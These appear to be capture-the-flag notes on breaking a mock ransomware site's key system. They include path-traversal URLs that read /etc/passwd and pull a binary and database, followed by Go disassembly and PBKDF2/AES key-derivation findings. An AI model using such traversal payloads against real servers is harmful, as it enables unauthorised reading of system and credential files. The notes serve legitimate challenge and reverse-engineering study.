you can LFI with https://gztkmtljeceezgmv.ransommethis.net/jrtwtevqduetiiho/fetchlog?log=keygeneration.log

https://gztkmtljeceezgmv.ransommethis.net/jrtwtevqduetiiho/fetchlog?log=../../../../etc/passwd
    lol, well played NSA. well played
    can't get /proc/self/environ either, rip

https://gztkmtljeceezgmv.ransommethis.net/jrtwtevqduetiiho/fetchlog?log=../../../../opt/keyMaster/keyMaster
    download the keyMaster binary

https://github.com/mandiant/goresym
    not sure this fixed anything up

keyMaster usage from the server
```py
result = subprocess.run(["/opt/keyMaster/keyMaster", 
						 'lock',
						 str(cid),
						 request.args.get('demand'),
						 util.get_username()],

result = subprocess.run(["/opt/keyMaster/keyMaster", 
						 'unlock', 
						 request.args.get('receipt')],

result = subprocess.run(["/opt/keyMaster/keyMaster", 
						'credit',
						args.get('hackername'),
						args.get('credits'),
						args.get('receipt')],
```

also downloaded
    /opt/keyMaster/keyMaster.db

main_get_pbkdf2_key
    uses gvkAE1VsL/pMABtgLHr8+A6XpUqDs7tBnkcC4DWmaWA=, not the solution

go abi
    https://go.googlesource.com/go/+/refs/heads/dev.regabi/src/cmd/compile/internal-abi.md

    RAX, RBX, RCX, RDI, RSI, R8, R9, R10, R11

had to update the credits for MelodicVixen in the db

```
$ ./keyMaster lock 1 1 MelodicVixen
{"plainKey":"22c18057-218d-11ed-af82-482ae328","result":"ok"}
```

plaintext: 22c18057-218d-11ed-af82-482ae328
encrypted: cTFwGnDr00p/8ODJuXOVKKNbuE9XcB6FrDZbYFl3nmNjoKFsza6u9NA2sKJslcQWA3Z36NVPysLlI7JCiCNKyQ==

aes-256-cbc

a receipt is some kind of jwt nonsense

```
.text:00000000005B856D loc_5B856D:                             ; CODE XREF: main_get_pbkdf2_key+EF↑j
.text:00000000005B856D                 mov     rax, rdx
.text:00000000005B8570                 mov     rbx, r8
.text:00000000005B8573                 mov     rcx, rbx
.text:00000000005B8576                 mov     rdi, [rsp+90h+var_20]
.text:00000000005B857B                 mov     rsi, [rsp+90h+var_40]
.text:00000000005B8580                 mov     r8, [rsp+90h+var_38]
.text:00000000005B8585                 mov     r9d, 1000h
.text:00000000005B858B                 mov     r10d, 20h ; ' '
.text:00000000005B8591                 lea     r11, off_6E7A88
.text:00000000005B8598                 call    golang_org_x_crypto_pbkdf2_Key
.text:00000000005B859D                 xor     edi, edi
.text:00000000005B859F                 xor     esi, esi
.text:00000000005B85A1                 mov     rbp, [rsp+90h+var_8]
.text:00000000005B85A9                 add     rsp, 90h
.text:00000000005B85B0                 retn
```

key derivation
	decrypt that b64 thing
	pbkdf2
		0x1000 rounds
		0x32 output key length (256 bits)

aes-256-cbc